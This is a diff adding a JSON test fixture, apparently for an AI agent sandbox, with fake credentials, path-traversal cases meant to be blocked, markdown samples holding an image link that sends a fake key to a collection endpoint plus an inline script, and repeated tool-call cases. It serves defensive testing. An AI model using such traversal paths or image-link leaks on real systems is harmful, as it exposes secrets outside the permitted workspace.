@@ -1,0 +1,60 @@
+{
+  "mock_host_env": {
+    "PATH": "/usr/local/bin:/usr/bin:/bin",
+    "LANG": "C.UTF-8",
+    "LC_ALL": "C.UTF-8",
+    "USER": "nightly-runner",
+    "FAKE_PROD_KEY": "FAKE_TEST_KEY_DO_NOT_USE_12345",
+    "DB_PASSWORD": "FAKE_TEST_KEY_DO_NOT_USE_67890",
+    "CLOUD_ADMIN_TOKEN": "FAKE_TEST_KEY_DO_NOT_USE_99999"
+  },
+  "workspace_files": {
+    "reports/nightly_summary.md": "# 夜间巡检纪要\n- 任务状态：已完成\n- 异常条目：0\n",
+    "notes/todo.txt": "1. 核对备份校验和\n2. 归档周度巡检日志\n"
+  },
+  "outside_files": {
+    "outside_secret.conf": "PROD_CREDENTIAL=FAKE_TEST_KEY_DO_NOT_USE_12345\n"
+  },
+  "path_cases": [
+    {
+      "id": "allow_nested_report",
+      "requested_path": "reports/nightly_summary.md",
+      "expect_allowed": true
+    },
+    {
+      "id": "allow_workspace_note",
+      "requested_path": "notes/todo.txt",
+      "expect_allowed": true
+    },
+    {
+      "id": "block_parent_escape",
+      "requested_path": "../outside_secret.conf",
+      "expect_allowed": false
+    },
+    {
+      "id": "block_nested_parent_escape",
+      "requested_path": "reports/../../outside_secret.conf",
+      "expect_allowed": false
+    }
+  ],
+  "markdown_samples": {
+    "mixed_preview": "# 巡检预览报告\n本地架构示意图：![系统拓扑](assets/topology.png)\n外部追踪探针：![probe](http://127.0.0.1:9999/collect?leak=FAKE_TEST_KEY_DO_NOT_USE_12345)\n安全外链测试：![cdn](https://tracker.example.invalid/pixel.gif)\n内联脚本测试：<script>window.alert(1)</script>"
+  },
+  "tool_loop_cases": {
+    "max_repeats": 2,
+    "runaway_calls": [
+      {"tool": "query_log_archive", "args": {"day": "2026-99-99"}},
+      {"tool": "query_log_archive", "args": {"day": "2026-99-99"}},
+      {"tool": "query_log_archive", "args": {"day": "2026-99-99"}},
+      {"tool": "query_log_archive", "args": {"day": "2026-99-99"}},
+      {"tool": "query_log_archive", "args": {"day": "2026-99-99"}},
+      {"tool": "query_log_archive", "args": {"day": "2026-99-99"}}
+    ],
+    "healthy_calls": [
+      {"tool": "check_disk_usage", "args": {"mount": "/workspace"}},
+      {"tool": "query_log_archive", "args": {"day": "2026-99-99"}},
+      {"tool": "query_log_archive", "args": {"day": "2026-11-15"}},
+      {"tool": "summarize_status", "args": {"format": "brief"}}
+    ]
+  }
+}
